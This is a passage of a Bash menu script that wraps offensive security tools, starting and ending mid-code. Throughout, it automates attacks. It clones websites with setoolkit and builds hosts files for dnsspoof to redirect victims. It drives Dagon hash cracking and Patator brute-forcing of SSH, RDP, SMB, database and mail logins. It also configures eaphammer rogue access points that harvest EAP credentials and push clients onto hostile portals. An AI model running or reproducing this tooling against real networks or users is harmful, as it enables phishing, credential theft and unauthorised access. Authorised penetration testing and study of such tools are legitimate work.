\"$LPATH\"/ls\n\t\tgnome-terminal --geometry 60x15+999999+0 -e ./l132.sh\n\t\tgnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh\n\t#~ elif [[ \"$MITMSET\" = \"4\" ]]\n\t#~ then\n\t\t#~ service apache2 start\n\t#~ elif [[ \"$MITMSET\" = \"d4\" ]]\n\t#~ then\n\t\t#~ service apache2 stop\n\telif [[ \"$MITMSET\" = \"4\" ]]\n\tthen\n\t\techo -e \"Clone a website to one of the following IP(s):\"\n\t\tip addr | grep '/24' | awk -F \"inet \" {'print $2'} | cut -d '/' -f1\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\tgnome-terminal --geometry 66x40+999999+0 -e setoolkit\n\telif [[ \"$MITMSET\" = \"5\" ]]\n\tthen\n\t\techo -e \"Making you a hosts.txt file\"\n\t\techo -e \"\"\n\t\techo -e \"Enter your IP address that you started the server:\"\n\t\techo -e \"One of this/these:\"\n\t\tip addr | grep '/24' | awk -F \"inet \" {'print $2'} | cut -d '/' -f1\n\t\tread -e SERVIP\n\t\techo -e \"Enter the interface of that IP(e.g: wlan0):\"\n\t\tread -e INTIP\n\t\tif [[ -f \"\"$LPATH\"/HOSTS/hosts.txt\" ]]\n\t\tthen\n\t\t\trm \"$LPATH\"/HOSTS/hosts.txt\n\t\tfi\n\t\tmkdir \"$LPATH\"/HOSTS\n\t\tclear\n\t\twhile true\n\t\tdo\n\t\tclear\n\t\techo -e \"Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):\"\n\t\tread -e URL\n\t\techo \"$SERVIP\t$URL\" >> \"$LPATH\"/HOSTS/hosts.txt\n\t\tsleep 0.2\n\t\tclear\n\t\techo -e \"Add another one as well?\"$YNYES\"\"\n\t\tread -e ANOTHERHOST\n\t\tif [[ \"$ANOTHERHOST\" = \"n\" ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\t\tdone\n\t\tclear\n\t\techo -e \"Starting dnsspoof...\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\texport INTIP\n\t\txterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f \"$LPATH\"/HOSTS/hosts.txt'\t\t\t\t\n\telif [[ \"$MITMSET\" = \"back\" || \"$MITMSET\" = \"b\" ]]\n\tthen\n\t\tclear\n\t\tbreak\n\telif [[ \"$MITMSET\" = \"00\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telif [[ \"$MITMSET\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\n\tdone\nelif [[ \"$MITMATT\" = \"back\" || \"$MITMATT\" = \"b\" ]]\nthen\n\tBACKL=\"1\"\n\tbreak\nelif [[ \"$MITMATT\" = \"00\" ]]\nthen\t\t\t\n\tclear\n\texec bash \"$0\"\nelif [[ \"$MITMATT\" = \"0\" ]]\nthen\n\tclear\n\texit\nfi\n}\nfunction dagon_script\n{\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"DAGON\"\n\tdash_calc\n\tprintf '\\033]2;DAGON\\a'\n\tif [[ \"$HASH\" = \"\" || \"$HASH\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\tthen\n\t\tHASH=\"\\e[1;31mNONE\\e[0m\"\n\t\tOK=0\n\tfi\n\tif [[ \"$CORV\" = \"\" ]]\n\tthen\n\t\tCORV=\"crack\"\n\tfi\n\techo -e \"-----------------Basic options-----------------\"\n\techo -e \"\"$YS\" 1\"$CE\") Specify your hash(es)        CURRENT:$HASH\"\n\techo -e \"\"$YS\" 2\"$CE\") Crack/verify                 CURRENT:$CORV\"\n\tif [[ -f /root/lscript/hashlog.txt ]]\n\tthen\n\t\techo -e \"\"$YS\" 3\"$CE\") View your last log\"\n\telse\n\t\techo -e \"\"$RS\" 3\"$CE\") View your last log\"\n\tfi\n\techo -e \"--------------------Optional--------------------\"\n\tif [[ \"$DICTATTACK\" = \"\" ]]\n\tthen\n\t\tDICTATTACK=\"OFF\"\n\tfi\n\techo -e \"\"$YS\" 4\"$CE\") Dictionary attack            CURRENT:$DICTATTACK\"\n\tif [[ \"$DICT\" = \"\" && $DICTATTACK = \"OFF\" ]]\n\tthen\n\t\tDICT=\"OFF\"\n\telif [[ \"$DICT\" = \"\\e[1;31mNONE\\e[0m\" && $DICTATTACK = \"OFF\" ]]\n\tthen\n\t\tDICT=\"OFF\"\n\telif [[ \"$DICT\" = \"OFF\" && $DICTATTACK = \"ON\" ]]\n\tthen\n\t\tDICT=\"\\e[1;31mNONE\\e[0m\"\n\telif [[ \"$DICT\" = \"\" && $DICTATTACK = \"ON\" ]]\n\tthen\n\t\tDICT=\"\\e[1;31mNONE\\e[0m\"\n\tfi\n\tif [[ \"$DICTTYPE\" = 1 ]]\n\tthen\n\t\tDICT=\"$DICTPATH\"\n\telif [[ \"$DICTTYPE\" = 2 ]]\n\tthen\n\t\tDICT=\"multiple\"\n\telif [[ \"$DICTTYPE\" = 3 ]]\n\tthen\n\t\tDICT=\"$DICTPATH folder\"\n\tfi\n\techo -e \"   \"$YS\"5\"$CE\") Specify dictionary/ies     CURRENT:$DICT\"\n\techo -e \"------------------------------------------------\"\n\techo -e \"\"$YS\" b\"$CE\") Go back              \"$YS\"update\"$CE\") Update dagon\"\n\techo -e \"\"$YS\"start\"$CE\") Start\"\n\techo -e \"Choose: \"\n\tread DAGON\n\tclear\n\tif [[ \"$DAGON\" = \"back\" || \"$DAGON\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$DAGON\" = \"4\" ]]\n\tthen\n\t\tif [[ \"$DICTATTACK\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDICTATTACK=\"ON\"\n\t\telse\n\t\t\tDICTATTACK=\"OFF\"\n\t\tfi\n\telif [[ \"$DAGON\" = \"update\" ]]\n\tthen\n\t\tcd /root/dagon\n\t\tpython dagon.py --update\n\t\tsleep 3\n\telif [[ \"$DAGON\" = \"start\" ]]\n\tthen\n\t\tif [[ \"$HASH\" = \"\" || \"$HASH\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No hash selected.\"$CE\"\"\n\t\t\tsleep 3\n\t\tfi\n\t\tif [[ \"$DICTATTACK\" = \"ON\" && $DICT = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No dictionary selected, but dictionary option is enabled\"$CE\"\"\n\t\t\tsleep 5\n\t\t\tcontinue\n\t\tfi\n\t\tcd /root/dagon\n\t\tif [[ \"$HASHTYPE\" = 1 ]]\n\t\tthen\n\t\t\tif [[ \"$CORV\" = \"crack\" ]]\n\t\t\tthen\n\t\t\t\tHASHCOMMAND=\"python dagon.py -c \"$HASH\" --bruteforce\"\n\t\t\telse\n\t\t\t\tHASHCOMMAND=\"python dagon.py -v \"$HASH\"\"\n\t\t\tfi\n\t\telif [[ \"$HASHTYPE\" = 2 || \"$HASHTYPE\" = 3 ]]\n\t\tthen\n\t\t\tif [[ \"$CORV\" = \"crack\" ]]\n\t\t\tthen\n\t\t\t\tHASHCOMMAND=\"python dagon.py -l \"$HASH\" --bruteforce\"\n\t\t\telse\n\t\t\t\tHASHCOMMAND=\"python dagon.py -V \"$HASH\"\"\n\t\t\tfi\n\t\tfi\n\t\tif [[ \"$DICTATTACK\" = \"ON\" ]]\n\t\tthen\n\t\t\tif [[ \"$DICTTYPE\" = 1 ]]\n\t\t\tthen\n\t\t\t\tDICTCOMMAND=\"-w $DICTPATH\"\n\t\t\telif [[ \"$DICTTYPE\" = 2 ]]\n\t\t\tthen\n\t\t\t\tDICTCOMMAND=\"-W $DICTPATH\"\n\t\t\telif [[ \"$DICTTYPE\" = 3 ]]\n\t\t\tthen\n\t\t\t\tDICTCOMMAND=\"-D $DICTPATH\"\t\n\t\t\tfi\n\t\telse\n\t\t\tDICTCOMMAND=\"\"\n\t\tfi\t\n\t\t\n\t$HASHCOMMAND $DICTCOMMAND | tee \"$LPATH/hashlog.txt\"\n\techo -e \"$PAKTGB\"\n\t$READAK\n\telif [[ \"$DAGON\" = 5 ]]\n\tthen\n\t\techo -e \"\"$YS\" 1\"$CE\") Select one disctionary\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Select multiple disctionaries\"\n\t\techo -e \"\"$YS\" 3\"$CE\") Select a folder with disctionaries\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread DICTSEL\n\t\tclear\n\t\tif [[ \"$DICTSEL\" = 1 ]]\n\t\tthen\n\t\t\techo -e \"Type the path of the dictionary:\"\n\t\t\tread DICTPATH\n\t\t\tif [[ ! -f \"$DICTPATH\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"No such file\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\tDICTTYPE=1\n\t\telif [[ \"$DICTSEL\" = 2 ]]\n\t\tthen\n\t\t\techo -e \"Type the path of the first dictionary:\"\n\t\t\tread DICTPATH\n\t\t\tif [[ ! -f \"$DICTPATH\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"No such file\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$RS\"----------TO STOP, TYPE 0----------\"\n\t\t\t\techo -e \"Type the path of the next dictionary: \"\n\t\t\t\tread DICTNEXT\n\t\t\t\tif [[ \"$DICTNEXT\" = \"0\" || \"$DICTNEXT\" = \"o\" || \"$DICTNEXT\" = \"O\" ]]\n\t\t\t\tthen\n\t\t\t\t\tDICTTYPE=2\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tif [[ ! -f \"$DICTNEXT\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"No such file\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\t\tDICTPATH=\"\"$DICTPATH\",\"$DICTNEXT\"\"\n\t\t\tdone\n\t\telif [[ \"$DICTSEL\" = 3 ]]\n\t\tthen\n\t\t\techo -e \"Type the path of the folder:\"\n\t\t\tread DICTPATH\n\t\t\tif [[ ! -d \"$DICTPATH\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"No such folder\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\tDICTTYPE=3\n\t\telif [[ \"$DICTSEL\" = \"back\" || \"$DICTSEL\" = \"b\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\tfi\n\telif [[ \"$DAGON\" = 3 ]]\n\tthen\n\t\tif [[ ! -f /root/lscript/hashlog.txt ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No log found.\"$CE\"\"\n\t\t\tsleep 2\n\t\telse\n\t\t\tcat /root/lscript/hashlog.txt\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\tfi\n\telif [[ \"$DAGON\" = 1 ]]\n\tthen\n\t\tclear\n\t\techo -e \"\"$YS\" 1\"$CE\") Type a hash\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Type multiple hashes\"\n\t\techo -e \"\"$YS\" 3\"$CE\") Select a file with hashes\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread HASHES\n\t\tclear\n\t\tif [[ \"$HASHES\" = \"back\" || \"$HASHES\" = \"b\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\telif [[ \"$HASHES\" = 1 ]]\n\t\tthen\n\t\t\techo -e \"Type your hash: \"\n\t\t\tread HASH\n\t\t\tHASHTYPE=1\n\t\telif [[ \"$HASHES\" = 2 ]]\n\t\tthen\n\t\t\techo -e \"Type your first hash: \"\n\t\t\tread HASH\n\t\t\techo -e \"$HASH\" > $LPATH/hashes.txt\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$RS\"----------TO STOP, TYPE 0----------\"\n\t\t\t\techo -e \"Type your next hash: \"\n\t\t\t\tread HASH\n\t\t\t\tif [[ \"$HASH\" = \"0\" || \"$HASH\" = \"o\" || \"$HASH\" = \"O\" ]]\n\t\t\t\tthen\n\t\t\t\t\tHASH=\"multiple\"\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\t\techo -e \"$HASH\" >> $LPATH/hashes.txt\n\t\t\tdone\n\t\t\tHASHTYPE=2\n\t\telif [[ \"$HASHES\" = 3 ]]\n\t\tthen\n\t\t\techo -e \"Type the full path of the file: \"\n\t\t\tread HASHPATH\n\t\t\tif [[ ! -f \"$HASHPATH\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"There is not such file.\"$CE\"\"\n\t\t\t\tsleep 3\n\t\t\telse\n\t\t\t\tHASH=\"$HASHPATH\"\n\t\t\tfi\n\t\t\tHASHTYPE=3\n\t\tfi\n\telif [[ \"$DAGON\" = 00 ]]\n\tthen\n\t\texec bash $0\n\telif [[ \"$DAGON\" = 0 ]]\n\tthen\n\t\tclear\n\t\texit\n\telif [[ \"$DAGON\" = 2 ]]\n\tthen\n\t\tif [[ \"$CORV\" = \"crack\" ]]\n\t\tthen\n\t\t\tCORV=\"verify\"\n\t\telse\n\t\t\tCORV=\"crack\"\n\t\tfi\n\tfi\ndone\n}\nfunction patator_automation\n{\nwhile true\ndo\n\t\tclear\n\t\techo -e \"\"$BS\"Modes\"$CE\":\"\n\tpttr=$(cat <<EOF\n$YS  1$CE) ftp_login      : Brute-force FTP\n$YS  2$CE) ssh_login      : Brute-force SSH\n$YS  3$CE) telnet_login   : Brute-force Telnet\n$YS  4$CE) smtp_login     : Brute-force SMTP\n$YS  5$CE) smtp_vrfy      : Enumerate valid users using the SMTP VRFY command\n$YS  6$CE) smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command\n$YS  7$CE) finger_lookup  : Enumerate valid users using Finger\n$YS  8$CE) http_fuzz      : Brute-force HTTP/HTTPS\n$YS  9$CE) ajp_fuzz       : Brute-force AJP\n$YS 10$CE) pop_login      : Brute-force POP\n$YS 11$CE) pop_passd      : Brute-force poppassd (not POP3)\n$YS 12$CE) imap_login     : Brute-force IMAP\n$YS 13$CE) ldap_login     : Brute-force LDAP\n$YS 14$CE) smb_login      : Brute-force SMB\n$YS 15$CE) smb_lookupsid  : Brute-force SMB SID-lookup\n$YS 16$CE) rlogin_login   : Brute-force rlogin\n$YS 17$CE) vmauthd_login  : Brute-force VMware Authentication Daemon\n$YS 18$CE) mssql_login    : Brute-force MSSQL\n$YS 19$CE) oracle_login   : Brute-force Oracle\n$YS 20$CE) mysql_login    : Brute-force MySQL\n$YS 21$CE) mysql_query    : Brute-force MySQL queries\n$YS 22$CE) rdp_login      : Brute-force RDP (NLA)\n$YS 23$CE) pgsql_login    : Brute-force PostgreSQL\n$YS 24$CE) vnc_login      : Brute-force VNC\n$YS 25$CE) dns_forward    : Brute-force DNS\n$YS 26$CE) dns_reverse    : Brute-force DNS (reverse lookup subnets)\n$YS 27$CE) ike_enum       : Enumerate IKE transforms\n$YS 28$CE) snmp_login     : Brute-force SNMPv1/2 and SNMPv3\n$YS 29$CE) unzip_pass     : Brute-force the password of encrypted ZIP files\n$YS 30$CE) keystore_pass  : Brute-force the password of Java keystore files\n$YS 31$CE) sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases\n$YS 32$CE) umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes\nEOF\n)\n\techo -e \"$pttr\"\n\techo -e \"Choose: \"\n\tread PT\n\tif [[ \"$PT\" = 1 ]]\n\tthen\n\t\tXPT=\"ftp_login\"\n\telif [[ \"$PT\" = 2 ]]\n\tthen\n\t\tXPT=\"ssh_login\"\n\telif [[ \"$PT\" = 3 ]]\n\tthen\n\t\tXPT=\"telnet_login\"\n\telif [[ \"$PT\" = 4 ]]\n\tthen\n\t\tXPT=\"smtp_login\"\n\telif [[ \"$PT\" = 5 ]]\n\tthen\n\t\tXPT=\"smtp_vrfy\"\n\telif [[ \"$PT\" = 6 ]]\n\tthen\n\t\tXPT=\"smtp_rcpt\"\n\telif [[ \"$PT\" = 7 ]]\n\tthen\n\t\tXPT=\"finger_lookup\"\n\telif [[ \"$PT\" = 8 ]]\n\tthen\n\t\tXPT=\"http_fuzz\"\n\telif [[ \"$PT\" = 9 ]]\n\tthen\n\t\tXPT=\"ajp_fuzz\"\n\telif [[ \"$PT\" = 10 ]]\n\tthen\n\t\tXPT=\"pop_login\"\n\telif [[ \"$PT\" = 11 ]]\n\tthen\n\t\tXPT=\"pop_passd\"\n\telif [[ \"$PT\" = 12 ]]\n\tthen\n\t\tXPT=\"imap_login\"\n\telif [[ \"$PT\" = 13 ]]\n\tthen\n\t\tXPT=\"ldap_login\"\n\telif [[ \"$PT\" = 14 ]]\n\tthen\n\t\tXPT=\"smb_login\"\n\telif [[ \"$PT\" = 15 ]]\n\tthen\n\t\tXPT=\"smb_lookupsid\"\n\telif [[ \"$PT\" = 16 ]]\n\tthen\n\t\tXPT=\"rlogin_login\"\n\telif [[ \"$PT\" = 17 ]]\n\tthen\n\t\tXPT=\"vmauthd_login\"\n\telif [[ \"$PT\" = 18 ]]\n\tthen\n\t\tXPT=\"mssql_login\"\n\telif [[ \"$PT\" = 19 ]]\n\tthen\n\t\tXPT=\"oracle_login\"\n\telif [[ \"$PT\" = 20 ]]\n\tthen\n\t\tXPT=\"mysql_login\"\n\telif [[ \"$PT\" = 21 ]]\n\tthen\n\t\tXPT=\"mysql_query\"\n\telif [[ \"$PT\" = 22 ]]\n\tthen\n\t\tXPT=\"rdp_login\"\n\telif [[ \"$PT\" = 23 ]]\n\tthen\n\t\tXPT=\"pgsql_login\"\n\telif [[ \"$PT\" = 24 ]]\n\tthen\n\t\tXPT=\"vnc_login\"\n\telif [[ \"$PT\" = 25 ]]\n\tthen\n\t\tXPT=\"dns_forward\"\n\telif [[ \"$PT\" = 26 ]]\n\tthen\n\t\tXPT=\"dns_reverse\"\n\telif [[ \"$PT\" = 27 ]]\n\tthen\n\t\tXPT=\"ike_enum\"\n\telif [[ \"$PT\" = 28 ]]\n\tthen\n\t\tXPT=\"snmp_login\"\n\telif [[ \"$PT\" = 29 ]]\n\tthen\n\t\tXPT=\"unzip_pass\"\n\telif [[ \"$PT\" = 30 ]]\n\tthen\n\t\tXPT=\"keystore_pass\"\n\telif [[ \"$PT\" = 31 ]]\n\tthen\n\t\tXPT=\"sqlcipher_pass\"\n\telif [[ \"$PT\" = 32 ]]\n\tthen\n\t\tXPT=\"umbraco_crack\"\n\tfi\n\tif [[ \"$XPT\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$RS\"Wrong choice\"$CE\"\"\n\t\tsleep 3\n\t\tcontinue\n\telse\n\t\tcd /root/patator\n\t\texport XTP\n\t\txterm -T \"INSTRUCTIONS\" -hold -e \"echo -e \"---------------------------------------\" && echo -e 'start with: python patator.py $XPT' && echo -e \"---------------------------------------\" && python patator.py $XPT\" & disown\n\t\txterm -T \"PATATOR\" -hold & disown\n\tfi\ndone\n}\nfunction eaphammer_automation\n{\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\tTERMINALTITLE=\"EAPHAMMER\"\n\t\t\t\tdash_calc\n\t\t\t\tprintf '\\033]2;EAPHAMMER\\a'\n\t\t\t\tif [[ \"$EAPHIFACE\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHIFACE=\"$WLANN\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHESSID\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHESSID=\"\"$RS\"NONE\"$CE\"\"\n\t\t\t\t\tOK1=0\n\t\t\t\telif [[ \"$EAPHESSID\" != \"\\e[1;31mNONE\\e[0m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tOK1=1\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHBSSID\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHBSSID=\"\"$RS\"NONE\"$CE\"\"\n\t\t\t\t\tOK1=0\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHCHANNEL\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHCHANNEL=\"\"$RS\"NONE\"$CE\"\"\n\t\t\t\t\tOK1=0\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHWPA\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHWPA=\"2\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAUTH\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHAUTH=\"\"$RS\"NONE\"$CE\"\"\n\t\t\t\t\tOK1=0\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHCREDS\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHCREDS=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHHOSTILE\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHHOSTILE=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHCAPTIVE\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHCAPTIVE=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHPIVOT\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHPIVOT=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHKARMA\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHKARMA=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHAIRCRACK=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHINTAUTO\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHINTAUTO=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" = \"OFF\" && \"$EAPHINTAUTO\" = \"OFF\" && \"$EAPHWORD\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHWORD=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" = \"OFF\" && \"$EAPHINTAUTO\" = \"OFF\" && \"$EAPHWORD\" = \"OFF\" ]]\n\t\t\t\tthen\n\t\t\t\t\tEAPHWORD=\"OFF\"\n\t\t\t\tfi\n\t\t\t\tOK2=1\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" != \"OFF\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHWORD\" = \"OFF\" || \"$EAPHWORD\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHWORD=\"\\e[1;31mNONE\\e[0m\"\n\t\t\t\t\t\tOK2=0\n\t\t\t\t\tfi\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHINTAUTO\" = \"ON\" || \"$EAPHWORD\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHWORD\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHWORD=\"\\e[1;31mNONE\\e[0m\"\n\t\t\t\t\t\tOK2=0\n\t\t\t\t\tfi\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHINTAUTO\" = \"OFF\" && \"$EAPHAIRCRACK\" = \"OFF\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHWORD\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHWORD=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\tfi\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Create a new RADIUS cert for your AP\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Set your interface for the AP               CURRENT: $EAPHIFACE\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Specify access point ESSID                  CURRENT: $EAPHESSID\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") Specify access point BSSID                  CURRENT: $EAPHBSSID\"\n\t\t\t\techo -e \"\"$YS\" 5\"$CE\") Specify access point channel                CURRENT: $EAPHCHANNEL\"\n\t\t\t\techo -e \"\"$YS\" 6\"$CE\") Specify WPA type                            CURRENT: $EAPHWPA\"\n\t\t\t\techo -e \"\"$YS\" 7\"$CE\") Specify auth type                           CURRENT: $EAPHAUTH\"\n\t\t\t\techo -e \"\"$YS\" 8\"$CE\") Harvest EAP creds                           CURRENT: $EAPHCREDS\"\n\t\t\t\techo -e \"\"$YS\" 9\"$CE\") Force clients to connect to hostile portal  CURRENT: $EAPHHOSTILE\"\n\t\t\t\techo -e \"\"$YS\"10\"$CE\") Force clients to connect to captive portal  CURRENT: $EAPHCAPTIVE\"\n\t\t\t\techo -e \"\"$YS\"11\"$CE\") Perform an indirect wireless pivot          CURRENT: $EAPHPIVOT\"\n\t\t\t\techo -e \"\"$YS\"12\"$CE\") Enable karma                                CURRENT: $EAPHKARMA\"\n\t\t\t\techo -e \"\"$YS\"13\"$CE\") Use autocrack/add with remote cracking rig  CURRENT: $EAPHAIRCRACK\"\n\t\t\t\techo -e \"\"$YS\"14\"$CE\") Use internal autocrack                      CURRENT: $EAPHINTAUTO\"\n\t\t\t\techo -e \"\"$YS\"15\"$CE\") Specify wordlist for autocrack              CURRENT: $EAPHWORD\"\n\t\t\t\techo -e \"\"$YS\"start\"$CE\") Start \"\n\t\t\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\t\t\techo -e \"\"$YS\" back\"$CE\") Go back\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread EAPH\n\t\t\t\tclear\n\t\t\t\tif [[ \"$EAPH\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tcd /root/eaphammer\n\t\t\t\t\t./eaphammer --cert-wizard\n\t\t\t\telif [[ \"$EAPH\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Type the interface you want to use: \"\n\t\t\t\t\tread EAPHIFACE\n\t\t\t\telif [[ \"$EAPH\" = 3 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Type the ESSID: \"\n\t\t\t\t\tread EAPHESSID\n\t\t\t\telif [[ \"$EAPH\" = 4 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Type the BSSID: \"\n\t\t\t\t\tread EAPHBSSID\n\t\t\t\telif [[ \"$EAPH\" = 5 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Type the channel: \"\n\t\t\t\t\tread EAPHCHANNEL\n\t\t\t\telif [[ \"$EAPH\" = 6 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHWPA\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHWPA=2\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHWPA=1\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 7 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Open\"\n\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") ttls\"\n\t\t\t\t\techo -e \"\"$YS\" 3\"$CE\") peap\"\n\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\tread PAUTH\n\t\t\t\t\tif [[ \"$PAUTH\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHAUTH=\"open\"\n\t\t\t\t\telif [[ \"$PAUTH\" = 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHAUTH=\"ttls\"\n\t\t\t\t\telif [[ \"$PAUTH\" = 3 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHAUTH=\"peap\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 8 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHCREDS\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHCREDS=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHCREDS=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 9 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHHOSTILE\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHHOSTILE=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHHOSTILE=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 10 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHCAPTIVE\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHCAPTIVE=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHCAPTIVE=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 11 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHPIVOT\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHPIVOT=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHPIVOT=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 12 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ 